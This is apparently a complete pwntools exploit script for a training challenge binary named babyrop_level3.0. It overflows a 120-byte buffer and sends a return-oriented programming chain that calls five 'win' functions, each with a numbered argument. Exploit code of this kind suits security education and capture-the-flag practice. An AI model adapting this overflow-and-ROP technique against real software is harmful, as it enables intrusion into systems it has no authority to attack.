from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level3.0')

rop = ROP(elf)
pop_rdi = rop.rdi.address

wins = [0x4028e5, 0x402640, 0x402720, 0x40255a, 0x402802]

for i in range(5):
    rop.raw(pop_rdi)
    rop.raw(i+1)
    rop.raw(wins[i]) # win 

p = process("/challenge/babyrop_level3.0")
payload = b"A" * (120) + rop.chain()
p.send(payload)
print(p.recvall())
p.close()
